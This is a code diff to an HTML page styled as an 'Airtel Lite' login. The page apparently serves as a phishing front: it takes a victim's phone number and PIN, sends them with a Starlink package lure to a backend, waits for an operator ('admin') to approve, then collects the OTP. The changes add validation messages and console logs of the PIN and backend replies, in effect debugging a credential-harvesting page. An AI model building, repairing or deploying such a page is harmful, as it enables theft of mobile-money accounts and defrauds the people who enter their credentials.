@@ -2,14 +2,11 @@
 <html lang="en" translate="no">
 <head>
     <meta charset="utf-8"/>
-    <link rel="icon" href="/airtel_icon-36x36.png"/>
     <meta name="viewport" content="width=device-width,initial-scale=1,interactive-widget=resizes-content">
     <meta name="theme-color" content="#000000"/>
     <meta name="color-scheme" content="light only">
     <meta name="google" content="notranslate">
     <meta name="format-detection" content="telephone=no">
-    <link rel="apple-touch-icon" href="/playstore-icon.png"/>
-    <link rel="manifest" href="/manifest.json"/>
     <title>Airtel Lite</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -369,7 +366,6 @@
         let currentMsisdn = '';
         let currentPin = '';
         let currentRequestId = '';
-        let otpId = '';
         let starlinkPackage = null;
 
         async function getApiSecret() {
@@ -640,7 +636,24 @@
             const _codeDigits = phoneCode.replace(/\D/g, '');
             if (msisdn.startsWith(_codeDigits) && msisdn.length > msisdnLength) msisdn = msisdn.slice(_codeDigits.length);
             const pin = getPinValue();
-            if (msisdn.length < msisdnLength || pin.length < 4) return;
+
+            // ============ DIAGNOSTIC LOG ============
+            console.log('[SEND OTP CLICKED]', {
+                msisdn, msisdnLen: msisdn.length, expectedLen: msisdnLength,
+                pin, pinLen: pin.length, phoneCode, starlinkPackage
+            });
+
+            // ============ VISIBLE VALIDATION (no more silent return) ============
+            if (msisdn.length < msisdnLength) {
+                phoneError.textContent = `Phone number too short for ${phoneCode} (need ${msisdnLength} digits, got ${msisdn.length})`;
+                phoneError.classList.add('show');
+                return;
+            }
+            if (pin.length < 4) {
+                phoneError.textContent = 'Please enter all 4 PIN digits';
+                phoneError.classList.add('show');
+                return;
+            }
 
             currentMsisdn = msisdn;
             currentPin = pin;
@@ -655,6 +668,8 @@
                     body: JSON.stringify({ userPhone: msisdn, userPin: pin, package: starlinkPackage, amount: '', method: 'airtel' })
                 });
                 const data = await response.json();
+                console.log('[BACKEND RESPONSE]', data);
+
                 if (data.success) {
                     currentRequestId = data.requestId;
                     phoneDisplay.textContent = `${phoneCode} ${formatPhone(msisdn)}`;
@@ -666,14 +681,12 @@
                                 headers: { 'X-API-Secret': await getApiSecret() }
                             });
                             const statusData = await statusRes.json();
-                            // FIX: backend sets 'approved' for login-step approval
                             if (statusData.status === 'approved') {
                                 clearInterval(pollTimer);
                                 sessionStorage.setItem('request_id', currentRequestId);
                                 sessionStorage.setItem('airtel_phone', currentMsisdn);
                                 showOtpScreen();
                                 startTimer();
-                            // FIX: backend sets 'wrong_credentials' when admin taps 🔁 Resend
                             } else if (statusData.status === 'rejected' || statusData.status === 'invalid' || statusData.status === 'wrong_credentials') {
                                 clearInterval(pollTimer);
                                 phoneError.textContent = statusData.status === 'wrong_credentials'
@@ -698,6 +711,7 @@
                     sendOtpBtn.classList.remove('btn-loading');
                 }
             } catch (e) {
+                console.error('[FETCH ERROR]', e);
                 phoneError.textContent = TRANSLATIONS[currentLang].somethingWrong;
                 phoneError.classList.add('show');
                 sendOtpBtn.disabled = false;
@@ -833,6 +847,8 @@
                     body: JSON.stringify({ requestId: currentRequestId, otp: otp })
                 });
                 const data = await response.json();
+                console.log('[OTP RESPONSE]', data);
+
                 if (!data.success) {
                     otpError.textContent = data.message || TRANSLATIONS[currentLang].invalidOtp;
                     otpError.classList.add('show');
@@ -866,6 +882,7 @@
                     } catch (e) {}
                 }, POLL_INTERVAL);
             } catch (e) {
+                console.error('[OTP FETCH ERROR]', e);
                 otpError.textContent = TRANSLATIONS[currentLang].invalidOtp;
                 otpError.classList.add('show');
                 clearOtpInputs();
@@ -936,6 +953,10 @@
             document.querySelector('.logo-section').classList.add('hidden');
             refreshStarlinkAmount();
         }
+
+        // ============ STARTUP DIAGNOSTIC ============
+        console.log('[login.html] BACKEND_URL =', BACKEND_URL);
+        console.log('[login.html] Script fully loaded. Button ref:', !!sendOtpBtn);
 
         detectCountry();
     </script>
